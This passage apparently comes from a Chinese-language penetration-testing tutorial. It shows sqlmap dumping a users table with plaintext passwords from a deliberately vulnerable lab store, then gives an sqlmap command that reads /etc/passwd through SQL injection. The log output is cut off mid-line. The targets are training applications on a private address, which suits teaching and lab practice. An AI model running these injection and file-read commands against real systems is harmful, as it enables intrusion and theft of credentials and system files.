  \ [INFO] resumed: \"\",\"user1@thebodgeitstore.com\",\"G3M\\uE=5L7C_[\",\"USER\"\
  ,\"1\"\n[01:13:09] [INFO] resumed: \"1\",\"test@thebodgeitstore.com\",\"password\"\
  ,\"USER\",\"3\"\nDatabase: PUBLIC\nTable: USERS\n[3 entries]\n+--------+---------------+-------+--------------------------------+---------------+\n\
  | USERID | CURRENTBASKETID | TYPE  | NAME                           | PASSWORD \
  \     |\n+--------+---------------+-------+--------------------------------+---------------+\n\
  | 2      | NULL          | ADMIN | admin@thebodgeitstore.com      | IRp^\\Q[=BDNW;\
  \ |\n| 1      | NULL          | USER  | user1@thebodgeitstore.com      | G3M\\uE=5L7C_[\
  \ |\n| 3      | 1             | USER  | test@thebodgeitstore.com       | password\
  \      |\n+--------+---------------+-------+--------------------------------+---------------+\n\
  [01:13:09] [INFO] table 'PUBLIC.USERS' dumped to CSV file '/root/.sqlmap/output/10.7.7.5/dump/PUBLIC/USERS.csv'\n\
  [01:13:09] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.7.7.5'\n\
  [*] shutting down at 01:13:09\n```\n\n攻击者的目标将是利用 SQL 注入漏洞在服务器上获得进一步立足点。使用 sqlmap，你可以通过利用注入漏洞在数据库服务器上读写文件，这会调用目标上的\
  \ load_file() 和 out_file() 函数来实现。在以下示例中，我们正在读取服务器上 /etc/passwd 文件的内容：\n\n```\nsqlmap\
  \ -u \"http://10.7.7.5/mutiliidae/index.php?page=user-info.php&username=admin&password=admin&user-info-php-submit-button=View+Account+Details\"\
  \ -p username --file-read /etc/passwd\n```\n\n\n\n[01:28:03] [INFO] the back-end\
  \ DBMS is MySQL\nweb server operating system: Linux Ubuntu 10.04 (Lucid Lynx)\n\
  web application technology: PHP 5.3.2, Apache 2.2.14\nback-end DBMS: MySQL >= 5.0\n\
  [01:28:03] [INFO] fingerprinting the back-end DBMS operating system\n[01:28:03]\
  \ [INFO] the back-end DBMS operating system is Linux\n[01:28:03] [INFO] fetching\
  \ file: '/etc/passwd'\ndo you want confirmation that the remote file '/etc/passwd'\
  \ has been successfully downloaded from the back-end DBMS file system? [Y/n]\n[01:28:25]\
  \ [WARNING] reflective value(s) found and filtering out\n[01:28:25] [INFO] the local\
